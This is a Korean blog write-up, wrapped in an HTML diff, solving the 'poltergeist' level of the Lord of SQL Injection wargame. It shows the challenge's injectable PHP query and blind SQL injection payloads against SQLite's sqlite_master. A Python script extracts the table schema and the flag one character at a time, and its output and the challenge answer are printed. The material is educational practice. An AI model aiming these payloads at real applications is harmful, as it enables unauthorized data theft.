@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - poltergeist 문제풀이 | mingzzi</title>
+	<meta name="description" content="다음 문제는 poltergeist 이다.이번 문제는 소스 코드를 좀 많이 짜야했다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2019/07/04/los-poltergeist.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - poltergeist 문제풀이</h1>
+    
+    <p class="meta">
+      July 4, 2019
+      
+    </p>
+  </header>
+  <section class="post-content"><p>다음 문제는 <code class="highlighter-rouge">poltergeist</code> 이다.</p>
+
+<p>이번 문제는 소스 코드를 좀 많이 짜야했다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------------------------------------------
+query : select id from member where id='admin' and pw=''
+-----------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nb">sqlite_open</span><span class="p">(</span><span class="s2">"./db/poltergeist.db"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from member where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">sqlite_fetch_array</span><span class="p">(</span><span class="nb">sqlite_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Hello </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nv">$poltergeistFlag</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"poltergeist"</span><span class="p">);</span><span class="c1">// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>내가 입력 한 값은 <code class="highlighter-rouge">member</code>라는 테이블에서 값을 추출하는 쿼리에 들어가는데, 문제를 풀기 위해서는 <code class="highlighter-rouge">$poltergeistFlag</code>라는 변수의 값을 입력 해 주어야 한다.</p>
+
+<p>또한 이 변수의 값은 이미 선언되어 있는 값이고, 주석에 해당 값은 <code class="highlighter-rouge">flag_{$hash}</code>라는 테이블에 들어 가 있다고 한다.</p>
+
+<p>즉, 주석에 적혀있는데로 데이터베이스를 다 뒤져야 한다. ㅠㅠ</p>
+
+<p>문제를 풀기 위해서는 먼저 테이블 명을 알고, 그 다음 컬럼 명 마지막으로 테이블명과 컬럼명을 바탕으로 데이터를 추출해야 한다.</p>
+
+<p><code class="highlighter-rouge">SQLite</code>는 데이터베이스의<code class="highlighter-rouge">schema</code>를 <code class="highlighter-rouge">sqlite_master</code>라는 테이블에 저장하고 있다.</p>
+
+<p>따라서 테이블명과 컬럼명을 알기 위해서는 해당 테이블을 이용하면 된다.</p>
+
+<p>테이블 명과 컬럼 명을 알 수 있는 쿼리문은 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select sql from sqlite_master where tbl_name like 'flag_%';
+</code></pre></div></div>
+
+<p>해당 쿼리를 입력하면 <code class="highlighter-rouge">sqlite_master</code>이라는 테이블에서 <code class="highlighter-rouge">tbl_name</code> 즉, 테이블 명이 <code class="highlighter-rouge">flag_%</code>의 형태로 이루어진 행을 찾아 그 행의 <code class="highlighter-rouge">sql</code> 열의 값을 추출한다.</p>
+
+<p><code class="highlighter-rouge">%</code>는 와일드카드로, 모든 문자를 의미하며, <code class="highlighter-rouge">like</code> 사용 시 <code class="highlighter-rouge">%</code>를 사용할 수 있다.</p>
+
+<p>따라서 <code class="highlighter-rouge">tbl_name like 'flag_%'</code> 구문은 <code class="highlighter-rouge">flag_a</code>, <code class="highlighter-rouge">flag_123</code>처럼 테이블 명에 <code class="highlighter-rouge">flag_</code>이 있고 해당 문자 뒤에 어떤 문자라도 들어있다면 대상에 속한다.</p>
+
+<p><code class="highlighter-rouge">sql</code>에는 해당 테이블을 생성하는 쿼리문이 저장되어 있다.</p>
+
+<p>즉, <code class="highlighter-rouge">create</code> 문이 저장되어 있는 것이다.</p>
+
+<p>이제 테이블 명과 컬럼명을 알아낼 수 있는 쿼리문을 찾았으니, 해당 쿼리문을 문제의 쿼리문에 더해서 하나의 쿼리문으로 만들어야 한다.</p>
+
+<p>현재 문제에 있는 쿼리는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select id from member where id='admin' and pw='{$_GET[pw]}'
+</code></pre></div></div>
+
+<p>따라서 내가 입력 한 값은 <code class="highlighter-rouge">$_GET[pw]</code>에 입력되기 때문에 서브쿼리 형태로 넣어주어야 한다.</p>
+
+<p>이를 위해 아래와 같이 쿼리를 구성했다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 길이 구하기
+select id from member where id='admin' and pw='1' or id='admin' and length((select sql from sqlite_master where tbl_name like 'flag_%'))=1 -- '
+
+# 내용 구하기
+select id from member where id='admin' and pw='1' or id='admin' and substr((select sql from sqlite_master where tbl_name like 'flag_%'), 1, 1)='a
+</code></pre></div></div>
+
+<p>또한 위의 방법으로 찾은 테이블 명과 컬럼 명을 가지고 플래그를 찾기 위해서는 아래의 쿼리를 사용했다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select COLUMN_NAME from TABLE_NAME
+</code></pre></div></div>
+
+<p>이를 코드로 구현하면 다음과 같다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">table</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">column</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">sql</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php?pw="</span>
+<span class="n">session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">"YOUR SESSION ID"</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"[+] Start"</span>
+
+<span class="k">print</span> <span class="s">"[+] Find length of the SQL"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and length((select sql from sqlite_master where tbl_name like 'flag_</span><span class="si">%</span><span class="s">'))="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">" -- "</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"[-] Error occur"</span>
+                <span class="k">continue</span>
+
+        <span class="k">if</span> <span class="s">'Hello admin'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">length</span> <span class="o">=</span> <span class="n">i</span>
+                <span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found length : "</span><span class="p">,</span> <span class="n">length</span>
+
+<span class="k">print</span> <span class="s">"[+] Find SQL"</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+                <span class="k">try</span><span class="p">:</span>
+                        <span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and substr((select sql from sqlite_master where tbl_name like 'flag_</span><span class="si">%</span><span class="s">'), "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="s">", 1)='"</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+                <span class="k">except</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="s">"[-] Error occur"</span>
+                        <span class="k">continue</span>
+
+                <span class="k">if</span> <span class="s">'Hello admin'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                        <span class="n">sql</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                        <span class="k">print</span> <span class="s">"[+] Found "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">sql</span>
+                        <span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found SQL : "</span><span class="p">,</span> <span class="n">sql</span>
+
+<span class="n">table</span> <span class="o">=</span> <span class="n">sql</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"`"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">column</span> <span class="o">=</span> <span class="n">sql</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"`"</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
+
+<span class="k">print</span> <span class="s">"[+] Find length of the flag"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and length((select "</span> <span class="o">+</span> <span class="n">column</span> <span class="o">+</span> <span class="s">" from "</span> <span class="o">+</span> <span class="n">table</span> <span class="o">+</span> <span class="s">"))="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">" -- "</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"[-] Error occur"</span>
+                <span class="k">continue</span>
+
+        <span class="k">if</span> <span class="s">'Hello admin'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">length</span> <span class="o">=</span> <span class="n">i</span>
+                <span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found length : "</span><span class="p">,</span> <span class="n">length</span>
+
+<span class="k">print</span> <span class="s">"[+] Find flag"</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+                <span class="k">try</span><span class="p">:</span>
+                        <span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and substr((select "</span> <span class="o">+</span> <span class="n">column</span> <span class="o">+</span> <span class="s">" from "</span> <span class="o">+</span> <span class="n">table</span> <span class="o">+</span> <span class="s">"), "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="s">", 1)='"</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+                <span class="k">except</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="s">"[-] Error occur"</span>
+                        <span class="k">continue</span>
+
+                <span class="k">if</span> <span class="s">'Hello admin'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                        <span class="k">print</span> <span class="s">"[+] Found "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span>
+                        <span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found flag : "</span><span class="p">,</span> <span class="n">flag</span>
+<span class="k">print</span> <span class="s">"[+] End"</span>
+</code></pre></div></div>
+
+<p>해당 코드를 실행하면 결과는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python test.py 
+[+] Start
+[+] Find length of the SQL
+[+] Found length :  54
+[+] Find SQL
+[+] Found 1 : C
+[+] Found 2 : CR
+[+] Found 3 : CRE
+[+] Found 4 : CREA
+[+] Found 5 : CREAT
+[+] Found 6 : CREATE
+[+] Found 7 : CREATE 
+[+] Found 8 : CREATE T
+[+] Found 9 : CREATE TA
+[+] Found 10 : CREATE TAB
+[+] Found 11 : CREATE TABL
+[+] Found 12 : CREATE TABLE
+[+] Found 13 : CREATE TABLE 
+[+] Found 14 : CREATE TABLE `
+[+] Found 15 : CREATE TABLE `f
+[+] Found 16 : CREATE TABLE `fl
+[+] Found 17 : CREATE TABLE `fla
+[+] Found 18 : CREATE TABLE `flag
+[+] Found 19 : CREATE TABLE `flag_
+[+] Found 20 : CREATE TABLE `flag_7
+[+] Found 21 : CREATE TABLE `flag_70
+[+] Found 22 : CREATE TABLE `flag_70c
+[+] Found 23 : CREATE TABLE `flag_70c8
+[+] Found 24 : CREATE TABLE `flag_70c81
+[+] Found 25 : CREATE TABLE `flag_70c81d
+[+] Found 26 : CREATE TABLE `flag_70c81d9
+[+] Found 27 : CREATE TABLE `flag_70c81d99
+[+] Found 28 : CREATE TABLE `flag_70c81d99`
+[+] Found 29 : CREATE TABLE `flag_70c81d99` 
+[+] Found 30 : CREATE TABLE `flag_70c81d99` (
+[+] Found 33 : CREATE TABLE `flag_70c81d99` (`
+[+] Found 34 : CREATE TABLE `flag_70c81d99` (`f
+[+] Found 35 : CREATE TABLE `flag_70c81d99` (`fl
+[+] Found 36 : CREATE TABLE `flag_70c81d99` (`fla
+[+] Found 37 : CREATE TABLE `flag_70c81d99` (`flag
+[+] Found 38 : CREATE TABLE `flag_70c81d99` (`flag_
+[+] Found 39 : CREATE TABLE `flag_70c81d99` (`flag_0
+[+] Found 40 : CREATE TABLE `flag_70c81d99` (`flag_08
+[+] Found 41 : CREATE TABLE `flag_70c81d99` (`flag_087
+[+] Found 42 : CREATE TABLE `flag_70c81d99` (`flag_0876
+[+] Found 43 : CREATE TABLE `flag_70c81d99` (`flag_08762
+[+] Found 44 : CREATE TABLE `flag_70c81d99` (`flag_087628
+[+] Found 45 : CREATE TABLE `flag_70c81d99` (`flag_0876285
+[+] Found 46 : CREATE TABLE `flag_70c81d99` (`flag_0876285c
+[+] Found 47 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`
+[+] Found 49 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`T
+[+] Found 50 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TE
+[+] Found 51 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEX
+[+] Found 52 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT
+[+] Found 54 : CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT)
+[+] Found SQL :  CREATE TABLE `flag_70c81d99` (`flag_0876285c`TEXT)
+[+] Find length of the flag
+[+] Found length :  38
+[+] Find flag
+[+] Found 1 : F
+[+] Found 2 : FL
+[+] Found 3 : FLA
+[+] Found 4 : FLAG
+[+] Found 5 : FLAG{
+[+] Found 6 : FLAG{e
+[+] Found 7 : FLAG{ea
+[+] Found 8 : FLAG{ea5
+[+] Found 9 : FLAG{ea5d
+[+] Found 10 : FLAG{ea5d3
+[+] Found 11 : FLAG{ea5d3b
+[+] Found 12 : FLAG{ea5d3bb
+[+] Found 13 : FLAG{ea5d3bbd
+[+] Found 14 : FLAG{ea5d3bbdc
+[+] Found 15 : FLAG{ea5d3bbdcc
+[+] Found 16 : FLAG{ea5d3bbdcc4
+[+] Found 17 : FLAG{ea5d3bbdcc4a
+[+] Found 18 : FLAG{ea5d3bbdcc4ae
+[+] Found 19 : FLAG{ea5d3bbdcc4aec
+[+] Found 20 : FLAG{ea5d3bbdcc4aec9
+[+] Found 21 : FLAG{ea5d3bbdcc4aec9a
+[+] Found 22 : FLAG{ea5d3bbdcc4aec9ab
+[+] Found 23 : FLAG{ea5d3bbdcc4aec9abe
+[+] Found 24 : FLAG{ea5d3bbdcc4aec9abe4
+[+] Found 25 : FLAG{ea5d3bbdcc4aec9abe4a
+[+] Found 26 : FLAG{ea5d3bbdcc4aec9abe4a6
+[+] Found 27 : FLAG{ea5d3bbdcc4aec9abe4a6a
+[+] Found 28 : FLAG{ea5d3bbdcc4aec9abe4a6a9
+[+] Found 29 : FLAG{ea5d3bbdcc4aec9abe4a6a9f
+[+] Found 30 : FLAG{ea5d3bbdcc4aec9abe4a6a9f6
+[+] Found 31 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66
+[+] Found 32 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66e
+[+] Found 33 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66ea
+[+] Found 34 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaa
+[+] Found 35 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa
+[+] Found 36 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa1
+[+] Found 37 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13
+[+] Found 38 : FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
+[+] Found flag :  FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
+[+] End
+</code></pre></div></div>
+
+<p>모든 데이터베이스를 뒤진 후에 플래그를 찾을 수 있었다.</p>
+
+<p>따라서 아래의 값을 입력하면 문제를 풀 수 있다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pw=FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--------------------------------------------------------------------------------------------------------------------
+query : select id from member where id='admin' and pw='FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}'
+--------------------------------------------------------------------------------------------------------------------
+
+POLTERGEIST Clear!
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nb">sqlite_open</span><span class="p">(</span><span class="s2">"./db/poltergeist.db"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from member where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">sqlite_fetch_array</span><span class="p">(</span><span class="nb">sqlite_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Hello </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nv">$poltergeistFlag</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"poltergeist"</span><span class="p">);</span><span class="c1">// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">POLTERGEIST Clear</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2019/07/04/los-poltergeist.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/07/03/los-banshee.html">
+        [Lord of SQL Injection] LoS - banshee 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/07/05/los-nessie.html">
+        [Lord of SQL Injection] LoS - nessie 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
